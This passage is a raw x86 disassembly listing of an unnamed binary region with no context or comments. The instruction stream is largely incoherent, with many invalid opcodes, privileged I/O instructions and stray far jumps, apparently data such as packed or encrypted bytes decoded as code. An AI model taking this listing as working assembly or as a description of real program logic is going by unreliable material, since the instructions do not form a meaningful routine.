  4188c5:	or     al,0xa
  4188c7:	sub    cl,dl
  4188c9:	inc    esi
  4188ca:	ss sar bl,cl
  4188cd:	jbe    0x4188fd
  4188cf:	jns    0x418927
  4188d1:	fwait
  4188d2:	jne    0x4188bd
  4188d4:	mov    eax,0x7002f8c0
  4188d9:	outs   dx,DWORD PTR ds:[esi]
  4188da:	outs   dx,BYTE PTR ds:[esi]
  4188db:	call   0x23e5:0x5d81c19d
  4188e2:	adc    al,0x6c
  4188e4:	xchg   BYTE PTR [ebx-0x63],dh
  4188e7:	sti    
  4188e8:	xchg   BYTE PTR [eax-0x5e],al
  4188eb:	or     BYTE PTR [eax+0x35],bl
  4188ee:	js     0x418900
  4188f0:	dec    ebx
  4188f1:	xor    ch,BYTE PTR [edi+0x2f5658c6]
  4188f7:	ficom  WORD PTR [ebp-0x2a]
  4188fa:	or     ch,bl
  4188fc:	and    BYTE PTR [edi],bl
  4188fe:	dec    ebx
  4188ff:	cli    
  418900:	or     BYTE PTR [esi+0x7d],dl
  418903:	cmp    al,0x1d
  418905:	sbb    eax,0xd7c2e24
  41890a:	fs push cs
  41890c:	loopne 0x418946
  41890e:	inc    ecx
  41890f:	push   ss
  418910:	sub    ecx,DWORD PTR [eax+0x4f]
  418913:	dec    esi
  418914:	adc    BYTE PTR [edx],dl
  418916:	int3   
  418917:	push   edi
  418918:	add    DWORD PTR [edi],0x37f8146e
  41891e:	inc    ebp
  41891f:	xor    edx,DWORD PTR [esi]
  418921:	popw   ds
  418923:	adc    al,0x0
  418925:	jle    0x418967
  418927:	or     BYTE PTR [ecx+0xc],bh
  41892a:	pop    ds
  41892b:	xor    eax,0x79b7f66
  418930:	jmp    0x41895d
  418932:	gs adc al,0x83
  418935:	enter  0xec,0x3b
  418939:	imul   ebx,DWORD PTR [eax],0x23
  41893c:	les    ebx,FWORD PTR [eax]
  41893e:	mov    esp,0x50618c0
  418943:	push   edi
  418944:	xchg   ebx,eax
  418945:	cmp    BYTE PTR [edi+eax*8],dl
  418948:	push   edx
  418949:	inc    edx
  41894a:	les    ebp,FWORD PTR [esi-0x69727a3b]
  418950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418952:	jno    0x418978
  418954:	adc    BYTE PTR [edx+ebp*2+0x3a9acc19],dl
  41895b:	mov    eax,ds:0x2eeff85c
  418960:	inc    esi
  418961:	loopne 0x4189b5
  418963:	jp     0x41893d
  418965:	jae    0x418971
  418967:	shr    BYTE PTR [eax],cl
  418969:	sub    DWORD PTR [edi],eax
  41896b:	add    DWORD PTR [edi-0x5b],eax
  41896e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41896f:	mov    edx,0x4030005
  418974:	repz sbb DWORD PTR [edx+esi*4],esp
  418978:	cs cld 
  41897a:	mov    al,0xef
  41897c:	(bad)  
  41897d:	jae    0x418987
  41897f:	sbb    BYTE PTR [eax+0x75f03b16],ah
  418985:	adc    DWORD PTR [esp+eax*1+0x23bac6ba],ecx
  41898c:	cmp    al,0xfb
  41898e:	jmp    0x78df916
  418993:	or     DWORD PTR [ebx-0x29d52a8e],0x1a30821e
  41899d:	mov    ebx,0xdfb0d72b
  4189a2:	mov    ds:0x438dd48d,eax
  4189a7:	lods   al,BYTE PTR ds:[esi]
  4189a8:	xchg   edi,esi
  4189aa:	push   esi
  4189ab:	sti    
  4189ac:	or     BYTE PTR [eax-0x7d],dh
  4189af:	xchg   ebx,eax
  4189b0:	fimul  DWORD PTR [ebx]
  4189b2:	mov    eax,esp
  4189b4:	xchg   esp,eax
  4189b5:	inc    eax
  4189b6:	add    DWORD PTR [esi],eax
  4189b8:	add    edi,DWORD PTR [eax+eax*4+0x2]
  4189bc:	mov    DWORD PTR [ebx],0x86360ebb
  4189c2:	and    ebx,DWORD PTR [esi-0x73]
  4189c5:	cs ret 
  4189c7:	xor    BYTE PTR [ecx],cl
  4189c9:	sbb    BYTE PTR [edi+0x3b],dl
  4189cc:	dec    ebx
  4189cd:	and    DWORD PTR [edi+0x51],ebx
  4189d0:	pop    edx
  4189d1:	int3   
  4189d2:	imul   edx,DWORD PTR [edi+0x58],0x46
  4189d6:	or     cl,BYTE PTR [edi]
  4189d8:	ds call 0xb71b:0x6cf197f
  4189e0:	pop    es
  4189e1:	dec    esp
  4189e2:	xor    esp,0x123a831c
  4189e8:	or     BYTE PTR [edi+ebx*2-0x18f05bf4],cl
  4189ef:	mov    eax,DWORD PTR [edx]
  4189f1:	pop    edx
  4189f2:	and    esp,esi
  4189f4:	or     BYTE PTR [edx+edi*1],bh
  4189f7:	mov    esp,0xbdb8bf87
  4189fc:	mov    edx,0xa1171558
  418a01:	sub    eax,0xabc7ce5e
  418a06:	aad    0xe
  418a08:	mul    BYTE PTR [edi+0x6b]
  418a0b:	adc    BYTE PTR [eax+0x169a10d8],0x89
  418a12:	pop    edx
  418a13:	or     BYTE PTR [esi+esi*4],al
  418a16:	ins    BYTE PTR es:[edi],dx
  418a17:	or     ecx,DWORD PTR [ebp+0xb16d9dd]
  418a1d:	cmp    edi,DWORD PTR [edi-0x4f]
  418a20:	and    DWORD PTR [edi+0x73],esi
  418a23:	rcl    BYTE PTR [edi],0xbb
  418a26:	xor    eax,DWORD PTR [edi]
  418a28:	je     0x418a54
  418a2a:	int3   
  418a2b:	outs   dx,BYTE PTR ds:[esi]
  418a2c:	mov    DWORD PTR [esi],0xea876a3
  418a32:	ret    
  418a33:	adc    esp,ecx
  418a35:	inc    ecx
  418a36:	cmp    DWORD PTR [esi],0xffffff9c
  418a39:	mov    al,ds:0x607adb3b
  418a3e:	or     eax,0x750ac46c
  418a43:	xor    eax,0x8777b768
  418a48:	adc    eax,DWORD PTR [ecx+0x3b]
  418a4b:	pop    ebp
  418a4c:	daa    
  418a4d:	mov    DWORD PTR [ecx],ebp
  418a4f:	add    al,0x9
  418a51:	add    eax,0xcf2d2b5c
  418a56:	jge    0x418a84
  418a58:	or     BYTE PTR [edx],bl
  418a5a:	std    
  418a5b:	xchg   DWORD PTR [ecx],edx
  418a5d:	ds pop ds
  418a5f:	push   esi
  418a60:	sbb    BYTE PTR [ecx],al
  418a62:	sbb    eax,0xcbfcc359
  418a67:	sbb    DWORD PTR [esi],ebx
  418a69:	pop    ds
  418a6a:	dec    esp
  418a6b:	add    al,BYTE PTR [edx-0x7]
  418a6e:	ds jmp 0xeb83:0x3debb6ac
  418a76:	and    ebx,ebp
  418a78:	jmp    0x418ae3
  418a7a:	jnp    0x418a90
  418a7c:	ins    DWORD PTR es:[edi],dx
  418a7d:	push   0x6d
  418a7f:	fild   DWORD PTR [eax+edx*2-0x3f6e3d73]
  418a86:	jl     0x418a94
  418a88:	xor    ebx,DWORD PTR ds:0xd37d5d81
  418a8e:	xchg   edx,eax
  418a8f:	xor    al,0xeb
  418a91:	push   ds
  418a92:	push   edi
  418a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a94:	inc    ecx
  418a95:	leave  
  418a96:	mov    ch,0xb7
  418a98:	jne    0x418aa1
  418a9a:	iret   
  418a9b:	inc    ecx
  418a9c:	push   es
  418a9d:	pop    eax
  418a9e:	fdiv   DWORD PTR [ebx-0x52]
  418aa1:	and    BYTE PTR [edx+0x6a0cbaef],bh
  418aa7:	bound  ecx,QWORD PTR [eax-0x72]
  418aaa:	add    bh,cl
  418aac:	scas   eax,DWORD PTR es:[edi]
  418aad:	adc    BYTE PTR [edx+ecx*1],ah
  418ab0:	inc    edi
  418ab1:	sub    esp,0x53
  418ab4:	inc    edi
  418ab5:	xchg   BYTE PTR [edi-0x2d],dl
  418ab8:	mov    dl,0x6b
  418aba:	mov    ebx,esp
  418abc:	or     dh,al
  418abe:	je     0x418a6d
  418ac0:	clc    
  418ac1:	mov    bh,0x79
  418ac3:	push   ss
  418ac4:	fwait
  418ac5:	pop    edi
  418ac6:	jle    0x418ab3
  418ac8:	inc    ebp
  418ac9:	cld    
  418aca:	adc    al,0xef
  418acc:	test   BYTE PTR [esp+ebp*8],dl
  418acf:	lea    ecx,[esi]
  418ad1:	and    BYTE PTR [ecx],dh
  418ad3:	popf   
  418ad4:	add    ebx,0xffffffdb
  418ad7:	sbb    al,0x71
  418ad9:	loope  0x418add
  418adb:	dec    esi
  418adc:	cmp    ebx,0x9
  418adf:	add    eax,0x484385bb
  418ae4:	out    dx,al
  418ae5:	adc    eax,DWORD PTR [edi+0xf]
  418ae8:	(bad)  
  418ae9:	lods   al,BYTE PTR ds:[esi]
  418aea:	or     esi,esp
  418aec:	push   ebp
  418aed:	lods   eax,DWORD PTR ds:[esi]
  418aee:	popf   
  418aef:	scas   al,BYTE PTR es:[edi]
  418af0:	test   eax,edi
  418af2:	cmp    eax,edi
  418af4:	aad    0x89
  418af6:	or     al,0xec
  418af8:	sbb    esp,ebx
  418afa:	lods   eax,DWORD PTR ds:[esi]
  418afb:	ins    DWORD PTR es:[edi],dx
  418afc:	adc    esp,ebp
  418afe:	pop    es
  418aff:	xchg   esp,eax
  418b00:	and    bh,dh
  418b02:	or     eax,0xedc581a4
  418b07:	mov    dl,0xe
  418b09:	lock lock cmp ecx,DWORD PTR [ebx]
  418b0d:	jne    0x418b1d
  418b0f:	fwait
  418b10:	inc    ecx
  418b11:	loop   0x418b30
  418b13:	in     al,dx
  418b14:	jmp    0x418b3c
  418b16:	inc    ebx
  418b17:	dec    ebp
  418b18:	lock push cs
  418b1a:	loopne 0x418b75
  418b1c:	mov    dl,0x75
  418b1f:	pop    es
  418b20:	hlt    
  418b21:	sub    eax,0xedf4f0a3
  418b26:	xor    BYTE PTR [ebx-0x13e90713],cl
  418b2c:	or     ebx,DWORD PTR [eax]
  418b2e:	pop    ecx
  418b2f:	and    ecx,edi
  418b31:	ror    BYTE PTR [edi+edx*1],1
  418b34:	adc    BYTE PTR [esi],dl
  418b36:	inc    ebp
  418b37:	cld    
  418b38:	fcomp  DWORD PTR [edi]
  418b3a:	(bad)  
  418b3b:	jbe    0x418aff
  418b3d:	sub    BYTE PTR [eax+ebp*8],dl
  418b40:	cmp    esi,DWORD PTR [ebp+0x29537f14]
  418b46:	pop    es
  418b47:	inc    ecx
  418b48:	mov    bh,BYTE PTR ds:0x30dd2a4
  418b4e:	push   cs
  418b4f:	test   al,0x6c
  418b51:	and    BYTE PTR [ecx+ecx*1+0x5de14ae2],dh
  418b58:	mov    eax,ds:0xeba9c637
  418b5d:	xor    al,BYTE PTR [edx+edx*1+0x1f]
  418b61:	das    
  418b62:	stc    
  418b63:	add    ecx,ecx
  418b65:	add    DWORD PTR [ebx+esi*8],edx
  418b68:	mov    eax,DWORD PTR [ebp-0x4]
  418b6b:	pop    ebx
  418b6c:	mov    esp,ebp
  418b6e:	sub    bl,0x19
  418b71:	push   cs
  418b72:	lock stos DWORD PTR es:[edi],eax
  418b74:	sbb    DWORD PTR [ebx-0x4e],0x1c83ace6
  418b7b:	pop    ds
  418b7c:	jne    0x418b94
  418b7e:	jae    0x418b88
  418b80:	dec    edi
  418b81:	ss cmp al,0x43
  418b84:	mov    bl,0x6
  418b86:	mov    dh,0x16
  418b88:	(bad)  
  418b89:	push   ss
  418b8a:	ret    
  418b8b:	mov    eax,0x89214f0c
  418b90:	pop    ebp
  418b91:	clc    
  418b92:	and    DWORD PTR [esi],edx
  418b94:	addr16 sbb edi,esp
  418b97:	sub    al,0x2a
  418b99:	clc    
  418b9a:	sbb    dh,dh
  418b9c:	ret    
  418b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b9e:	cmovl  ecx,DWORD PTR [ecx]
  418ba1:	sbb    BYTE PTR [edi+esi*8-0x69baa0],dh
  418ba8:	or     eax,0xb6cdbece
  418bad:	inc    esp
  418bae:	sti    
  418baf:	mov    edx,0xb01e292b
  418bb4:	sub    DWORD PTR [edi],ebx
  418bb6:	push   ebx
  418bb7:	cmp    al,0x3d
  418bb9:	mov    eax,0x610c30e3
  418bbe:	mov    cl,0x7
  418bc0:	test   eax,0x8606f503
  418bc5:	and    DWORD PTR [ebx+0x39cd0a3e],eax
  418bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bcc:	lods   al,BYTE PTR ds:[esi]
  418bcd:	adc    al,0x84
  418bcf:	int3   
  418bd0:	ins    BYTE PTR es:[edi],dx
  418bd1:	push   ds
  418bd2:	and    cl,BYTE PTR [ebp-0x4ee3b3eb]
  418bd8:	jle    0x418bca
  418bda:	add    al,0xd0
  418bdc:	fs ret 
  418bde:	and    al,0x95
  418be0:	(bad)  
  418be1:	add    eax,ebx
  418be3:	sbb    ecx,esp
  418be5:	or     BYTE PTR [edi+0x2c751828],cl
  418beb:	xchg   edx,eax
  418bec:	sbb    BYTE PTR [ecx],al
  418bee:	cwde   
  418bef:	add    DWORD PTR [esi+0x4],0x7ed5103e
  418bf6:	add    eax,0x8f89aa25
  418bfb:	aaa    
  418bfc:	and    esi,eax
  418bfe:	clc    
  418bff:	or     eax,0x10e77200
  418c04:	js     0x418c7c
  418c06:	je     0x418c26
  418c08:	mov    bl,0xf8
  418c0a:	add    al,0x95
  418c0c:	or     ecx,edx
  418c0e:	ins    BYTE PTR es:[edi],dx
  418c0f:	out    dx,al
  418c10:	mov    ebx,0x8831e4e
  418c15:	add    ebx,ebp
  418c17:	cmp    al,0x7
  418c19:	jns    0x418c0b
  418c1b:	mov    edx,0x1bd82672
  418c20:	add    al,0x85
  418c22:	or     BYTE PTR [ecx+0x9],al
  418c25:	cmp    DWORD PTR [edi],esi
  418c27:	popa   
  418c28:	(bad)  
  418c29:	adc    BYTE PTR [eax],cl
  418c2b:	or     al,0x33
  418c2d:	sbb    dl,BYTE PTR [edi+eiz*8]
  418c30:	(bad)  
  418c31:	in     al,0x4e
  418c33:	mov    ch,BYTE PTR [ebp-0x615c2c54]
  418c39:	mov    eax,ds:0xe10bc800
  418c3e:	and    al,0xd6
  418c40:	push   ss
  418c41:	retf   0x4918
  418c44:	retf   
  418c45:	sbb    BYTE PTR [edi+0x3e],0x13
  418c49:	out    dx,eax
  418c4a:	arpl   WORD PTR [ecx-0x6f],si
  418c4d:	jo     0x418bda
  418c4f:	xor    BYTE PTR [ecx-0x51b43d1a],al
  418c55:	inc    eax
  418c56:	jmp    0x418c2b
  418c58:	(bad)  
  418c59:	in     eax,0x3b
  418c5b:	repz add eax,0x7e9f4944
  418c61:	mov    dh,0xda
  418c63:	sbb    bl,cl
  418c65:	or     dl,bh
  418c67:	nop
  418c68:	out    dx,al
  418c69:	sub    ebp,ebx
  418c6b:	idiv   DWORD PTR [ebx]
  418c6d:	adc    eax,0x8323180
  418c72:	sub    BYTE PTR ds:0x8c8ec12d,ch
  418c78:	mov    ch,0xf6
  418c7a:	jge    0x184abdef
  418c80:	sub    DWORD PTR [ebx-0x3c3a3022],ecx
  418c86:	cli    
  418c87:	inc    ebx
  418c88:	scas   al,BYTE PTR es:[edi]
  418c89:	inc    ebp
  418c8a:	test   BYTE PTR [eax],0x9f
  418c8d:	or     BYTE PTR [eax+0x6c],bl
  418c90:	or     edx,DWORD PTR [esi-0x60]
  418c93:	call   0x542b9300
  418c98:	inc    esp
  418c99:	(bad)  
  418c9b:	cmp    ebp,0xffffffdc
  418c9e:	and    ecx,ebp
  418ca0:	(bad)  
  418ca1:	sbb    eax,DWORD PTR [esi]
  418ca3:	outs   dx,DWORD PTR ds:[esi]
  418ca4:	in     al,dx
  418ca5:	int    0x2
  418ca7:	sub    BYTE PTR [eax],ch
  418ca9:	add    eax,0x9c204cca
  418cae:	movhps xmm2,QWORD PTR [ebx-0x75]
  418cb2:	sti    
  418cb3:	sub    edi,esi
  418cb5:	mov    eax,0xec7b1be9
  418cba:	cmp    eax,DWORD PTR gs:[ebx+0x7294f7f]
  418cc1:	add    DWORD PTR ds:0x3a425918,eax
  418cc7:	arpl   WORD PTR [edi],cx
  418cc9:	sbb    BYTE PTR [ecx-0x4e9bfaed],ah
  418ccf:	pop    esi
  418cd0:	mov    eax,ds:0x16736e46
  418cd5:	mov    bl,0xec
  418cd7:	mov    ebx,DWORD PTR [edi]
  418cd9:	or     ecx,ebx
  418cdb:	and    eax,0x58d80b5a
  418ce0:	sbb    dh,bh
  418ce2:	popa   
  418ce3:	dec    ecx
  418ce4:	mov    BYTE PTR [eax],dl
  418ce6:	not    DWORD PTR [edi]
  418ce8:	les    edx,FWORD PTR [esi]
  418cea:	clc    
  418ceb:	and    cl,cl
  418ced:	dec    edi
  418cee:	enter  0xfc6a,0xfd
  418cf2:	xchg   DWORD PTR [ecx+0x3c7b77e],ebx
  418cf8:	lds    esp,FWORD PTR [ecx]
  418cfa:	sub    edi,ebp
  418cfc:	adc    edx,0x2b
  418cff:	add    al,0xa
  418d01:	inc    ebp
  418d02:	mov    esi,0x250ed4ef
  418d07:	gs loop 0x418d2f
  418d0a:	xor    bl,bh
  418d0c:	dec    edi
  418d0d:	add    ebx,ebp
  418d0f:	in     al,0x59
  418d11:	jmp    0x418d4e
  418d13:	mov    ebp,0x15cd09c9
  418d18:	iret   
  418d19:	sub    ah,BYTE PTR [eax+0x59]
  418d1c:	mov    bl,0x81
  418d1e:	not    DWORD PTR ds:0x11341bd7
  418d24:	cwde   
  418d25:	push   cs
  418d26:	mov    DWORD PTR [esi+edx*8-0x3f],eax
  418d2a:	cs pushf 
  418d2c:	pop    ss
  418d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d2e:	jmp    0x418d4d
  418d30:	ret    0x263
  418d33:	or     al,0x81
  418d35:	xchg   BYTE PTR [ebx],cl
  418d37:	or     DWORD PTR [ebx+0xe],eax
  418d3a:	jmp    0x1418cb83
  418d3f:	enter  0x4e93,0x2
  418d43:	sbb    BYTE PTR [ecx],0x94
  418d46:	retf   
  418d47:	sbb    DWORD PTR [ecx+0x528558ee],edx
  418d4d:	fsub   DWORD PTR [ecx+0x16]
  418d50:	ror    BYTE PTR [ebp-0x5a1d38b2],1
  418d56:	add    eax,0x3debfcd8
  418d5b:	in     eax,dx
  418d5c:	adc    ecx,DWORD PTR [esp+ebx*2+0x16]
  418d60:	inc    ebx
  418d61:	jb     0x418ce9
  418d63:	xchg   esi,eax
  418d65:	ror    DWORD PTR [ebx],0x7d
  418d68:	loopne 0x418d6d
  418d6a:	in     eax,dx
  418d6b:	jge    0x418d6f
  418d6d:	sbb    al,0x7e
  418d6f:	je     0x418d83
  418d71:	ins    BYTE PTR es:[edi],dx
  418d72:	retf   
  418d73:	xchg   ecx,eax
  418d74:	test   ecx,esi
  418d76:	sbb    bl,bl
  418d78:	sub    BYTE PTR [ebx],bl
  418d7a:	mov    al,0x3f
  418d7c:	adc    al,0x8
  418d7e:	int    0xbd
  418d80:	push   0xffffff8b
  418d82:	in     al,0x19
  418d84:	cwde   
  418d85:	(bad)  
  418d86:	aad    0xaa
  418d88:	mov    ah,0xc5
  418d8a:	pop    ecx
  418d8b:	inc    ebx
  418d8c:	fcomp  DWORD PTR [ebx-0x3d00d482]
  418d92:	jno    0x418ded
  418d94:	int    0x15
  418d96:	inc    eax
  418d97:	cmp    bl,al
  418d99:	add    eax,0x1b00e75
  418d9e:	lods   al,BYTE PTR ds:[esi]
  418d9f:	bound  edi,QWORD PTR [eax-0x1467e5c9]
  418da5:	add    eax,0x1673d7cf
  418daa:	outs   dx,DWORD PTR ds:[esi]
  418dab:	ins    BYTE PTR es:[edi],dx
  418dac:	sbb    eax,DWORD PTR [ebp+0x3c2a15aa]
  418db2:	cmp    BYTE PTR ds:0xece8eab8,ch
  418db8:	mov    al,0x2
  418dba:	daa    
  418dbb:	add    bh,dh
  418dbd:	ret    
  418dbe:	push   ecx
  418dbf:	arpl   WORD PTR [edi-0x3616a42b],di
  418dc5:	je     0x418df9
  418dc7:	jmp    0x418e3d
  418dc9:	sbb    BYTE PTR [eax-0x77],dl
  418dcc:	enter  0x4027,0x3b
  418dd0:	fist   DWORD PTR [esi-0x25]
  418dd3:	pop    ecx
  418dd4:	or     DWORD PTR [edx],esi
  418dd6:	sbb    DWORD PTR [eax-0x3d],esi
  418dd9:	sub    ecx,ebp
  418ddb:	lahf   
  418ddc:	xchg   ecx,eax
  418ddd:	in     eax,dx
  418dde:	ss pop eax
  418de0:	sbb    BYTE PTR [edi+edx*1],bh
  418de3:	jne    0x418dd0
  418de5:	adc    eax,0xb66f9901
  418dea:	je     0x418e1d
  418dec:	adc    al,dl
  418dee:	test   BYTE PTR [ecx],dh
  418df0:	out    0x6,eax
  418df2:	loope  0x418d7b
  418df4:	xlat   BYTE PTR ds:[ebx]
  418df5:	outs   dx,DWORD PTR ds:[esi]
  418df6:	mov    DWORD PTR [eax],edx
  418df8:	mov    dl,0x2d
  418dfa:	sbb    bl,al
  418dfc:	jno    0x418de1
  418dfe:	jnp    0x418e07
  418e00:	repz adc eax,0x4008db0f
  418e06:	xor    cl,BYTE PTR [ebx*8-0x7b97a456]
  418e0d:	pop    edi
  418e0e:	or     eax,0x98b54925
  418e13:	add    al,0xaf
  418e15:	jnp    0x418dda
  418e17:	aas    
  418e18:	cld    
  418e19:	jo     0x8bb8a71a
  418e1f:	mov    al,bl
  418e21:	mov    bl,BYTE PTR [eax-0x5cf6bbbf]
  418e27:	pop    ds
  418e28:	loop   0x418e95
  418e2a:	sub    eax,0x837f40aa
  418e2f:	loopne 0x418eb0
  418e31:	adc    ecx,DWORD PTR [edi+0x7a9ff63a]
  418e37:	dec    esp
  418e38:	ret    
  418e39:	push   eax
  418e3a:	push   edx
  418e3b:	push   ecx
  418e3c:	cmp    al,BYTE PTR [ebx-0x274e7e48]
  418e42:	in     eax,dx
  418e43:	push   ss
  418e44:	out    dx,al
  418e45:	pop    eax
  418e46:	jne    0x418ec3
  418e48:	xor    eax,eax
  418e4a:	xchg   edi,eax
  418e4b:	rep lods eax,DWORD PTR ds:[esi]
  418e4d:	push   ss
  418e4e:	sbb    DWORD PTR [ebx+0x74],ebp
  418e51:	pop    edx
  418e52:	mov    DWORD PTR ds:0x15adf602,edi
  418e58:	lods   eax,DWORD PTR ds:[esi]
  418e59:	mov    DWORD PTR [esi+0x60a2205],ebp
  418e5f:	je     0x418e8c
  418e61:	mov    ecx,0xffdbf4bf
  418e66:	jle    0x418e80
  418e68:	cmp    edx,eax
  418e6a:	jg     0x418e87
  418e6c:	sub    eax,edx
  418e6e:	inc    eax
  418e6f:	cli    
  418e70:	jl     0x418e86
  418e72:	cmp    ecx,eax
  418e74:	jg     0x418e92
  418e76:	(bad)  
  418e77:	mov    BYTE PTR [edi],cl
  418e79:	inc    edi
  418e7a:	repz icebp 
  418e7c:	sbb    edi,esp
  418e7e:	sti    
  418e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e80:	jmp    0x418e93
  418e82:	mov    edx,0x31e58b01
  418e87:	leave  
  418e88:	jmp    0x418ef6
  418e8a:	shr    ebx,0xe8
  418e8d:	mov    BYTE PTR [edi],al
  418e8f:	cmp    BYTE PTR ss:[ecx+0x43c23fb6],ah
  418e96:	adc    eax,DWORD PTR [ecx-0x216802e2]
  418e9c:	in     eax,dx
  418e9d:	adc    eax,0x74bbd1db
  418ea2:	sub    eax,0x4841999f
  418ea7:	lods   eax,DWORD PTR ds:[esi]
  418ea8:	fmul   QWORD PTR [ebp-0x3997777b]
  418eae:	xchg   ecx,eax
  418eaf:	add    DWORD PTR [edx],edi
  418eb1:	add    al,0xfe
  418eb3:	cs xor al,0x77
  418eb6:	test   DWORD PTR [ebp+0x41092484],0x5056850
  418ec0:	or     al,0xbc
  418ec3:	push   esp
  418ec4:	jne    0x418ec7
  418ec6:	jae    0x418f44
  418ec8:	xor    al,0x8d
  418eca:	mov    bl,0x14
  418ecc:	aas    
  418ecd:	or     eax,0x86c46a0e
  418ed2:	sub    bl,BYTE PTR [edi]
  418ed4:	sub    BYTE PTR [edx+0x28],bl
  418ed7:	shl    BYTE PTR [esi-0x50],0xb9
  418edb:	and    BYTE PTR [edi],ch
  418edd:	mov    al,ds:0xc44b106a
  418ee2:	add    al,BYTE PTR [edx-0x74]
  418ee5:	ja     0x418f0b
  418ee7:	or     cl,bh
  418ee9:	sbb    eax,0x905142de
  418eee:	or     al,0xbc
  418ef0:	xchg   edi,eax
  418ef1:	fstp   TBYTE PTR [ebp-0x763d0003]
  418ef7:	xlat   BYTE PTR ds:[ebx]
  418ef8:	mov    eax,ds:0x1377f739
  418efd:	je     0x418f2e
  418eff:	sar    ecx,0x2
  418f02:	js     0x418f2e
  418f04:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f06:	mov    ebx,0xec03e183
  418f0b:	imul   DWORD PTR [edi-0x53]
  418f0e:	iret   
  418f0f:	mov    esp,0xfc317421
  418f14:	lea    edi,[ecx+edi*1-0x4]
  418f18:	sbb    BYTE PTR [ecx],dl
  418f1a:	std    
  418f1b:	sbb    DWORD PTR [ecx],edx
  418f1d:	pop    esp
  418f1e:	mov    bh,0x1d
  418f20:	add    esi,0x2
  418f23:	(bad)  
  418f24:	pop    ds
  418f25:	cld    
  418f26:	and    BYTE PTR [edx-0x69ee1f31],bl
  418f2c:	sub    BYTE PTR [esi],al
  418f2e:	xchg   esi,eax
  418f2f:	sub    BYTE PTR [eax+0x242d34d2],bh
  418f35:	clc    
  418f36:	sbb    edi,esp
  418f38:	jg     0x418fb5
  418f3a:	mov    cx,WORD PTR [eax+0x4]
  418f3e:	sub    cx,0xd7b1
  418f43:	push   edx
  418f44:	dec    ecx
  418f45:	sub    cx,0x2
  418f49:	jae    0x418f39
  418f4b:	mov    BYTE PTR [ebp-0x2578c9],0xd3
  418f52:	add    bl,ch
  418f54:	sbb    edi,DWORD PTR [ebx+ebp*8]
  418f57:	pop    ss
  418f58:	cmp    DWORD PTR [ecx+0x52f768e6],eax
  418f5e:	adc    al,0x74
  418f60:	pop    es
  418f61:	push   es
  418f62:	push   ebx
  418f63:	loopne 0x418fdf
  418f65:	adc    DWORD PTR [eax+0x60],ebx
  418f68:	iret   
  418f69:	sbb    eax,0x7646766
  418f6e:	mov    eax,ebx
  418f70:	les    esp,FWORD PTR [ebx-0x5e913da0]
  418f76:	jb     0x418f94
  418f78:	push   cs
  418f79:	sbb    al,0xc
  418f7b:	inc    edi
  418f7c:	mov    bh,0xdb
  418f7e:	mov    dl,0x19
  418f80:	mov    esi,0x573d4358
  418f85:	jb     0x418fb6
  418f87:	add    eax,0xbb16d7b3
  418f8c:	lods   eax,DWORD PTR ds:[esi]
  418f8d:	std    
  418f8e:	ja     0x418fb9
  418f90:	and    ax,0xd7b2
  418f94:	or     DWORD PTR [ebx],eax
  418f96:	jne    0x418fd1
  418f98:	call   DWORD PTR [ebx+0x78]
  418f9b:	fucomp st(1)
  418f9d:	jae    0x418f95
  418f9f:	lock test esi,esi
  418fa2:	or     ah,BYTE PTR [esp+esi*2]
  418fa5:	sbb    esp,DWORD PTR [esi+0x4f]
  418fa8:	jmp    0x419025
  418faa:	sbb    ebx,DWORD PTR [ebx-0x5a0bed75]
  418fb0:	dec    eax
  418fb1:	dec    eax
  418fb2:	mov    eax,0x2f2f6369
  418fb7:	inc    esp
  418fb8:	cmp    dh,al
  418fba:	daa    
  418fbb:	push   es
  418fbc:	(bad)  
  418fbd:	mov    ch,cl
  418fbf:	shl    eax,0x10
  418fc2:	jmp    0x8905:0x66b70ff3
  418fc9:	ror    DWORD PTR [eax],1
  418fcb:	or     ebx,esi
  418fcd:	stos   DWORD PTR es:[edi],eax
  418fce:	mov    ecx,edx
  418fd0:	stos   BYTE PTR es:[edi],al
  418fd1:	pop    edi
  418fd2:	mov    esi,0x3f70d4d1
  418fd7:	sub    BYTE PTR [eax+0xc],dl
  418fda:	ins    BYTE PTR es:[edi],dx
  418fdb:	add    eax,0xccbfdb31
  418fe0:	div    dh
  418fe2:	sbb    ebx,edi
  418fe4:	add    BYTE PTR [edx+ecx*4],cl
  418fe7:	push   ds
  418fe8:	inc    esi
  418fe9:	je     0x41900b
  418feb:	je     0x418fe5
  418fed:	mov    ch,0x0
  418fef:	push   es
  418ff0:	sub    eax,0xcb046274
  418ff5:	retf   
  418ff6:	iret   
  418ff7:	repnz sub esi,DWORD PTR [edi+ebx*2+0x24]
  418ffc:	js     0x419072
  418ffe:	pop    edx
  418fff:	pop    eax
  419000:	je     0x419057
  419002:	xor    BYTE PTR ds:0x295af74f,cl
  419008:	daa    
  419009:	adc    DWORD PTR [eax+0x43],ecx
  41900c:	mov    ebx,0x8fedff20
  419011:	push   ss
  419012:	jne    0x419015
  419014:	sub    bl,0x30
  419017:	adc    DWORD PTR [ecx],ecx
  419019:	ja     0x419040
  41901b:	cmp    eax,edi
  41901d:	ja     0x419040
  41901f:	lea    esi,ds:0x4fdc3b8
  419025:	add    BYTE PTR [ecx],0xc0
  419028:	add    eax,ebx
  41902a:	sub    edi,edx
  41902c:	out    0xfe,al
  41902e:	int    0xe0
  419030:	out    dx,al
  419031:	(bad)  
  419032:	(bad)  
  419033:	mov    edi,0xeb547d69
  419038:	or     DWORD PTR [esi-0x15],eax
  41903b:	push   es
  41903c:	neg    eax
  41903e:	jle    0x41908b
  419040:	js     0x41908b
  419042:	pop    ebx
  419043:	sub    esi,ebx
  419045:	jmp    0x41908e
  419047:	inc    ch
  419049:	and    bl,ch
  41904b:	pushf  
  41904c:	mov    edi,0x96c76f6
  419051:	push   es
  419052:	cvtpi2ps xmm6,QWORD PTR [edi+ebx*8+0x41]
  419057:	popa   
  419058:	jb     0x41905d
  41905a:	dec    ecx
  41905b:	not    DWORD PTR [edi+0x4c20d9ed]
  419061:	jbe    0x41906e
  419063:	pop    es
  419064:	adc    DWORD PTR ds:0xc380d077,eax
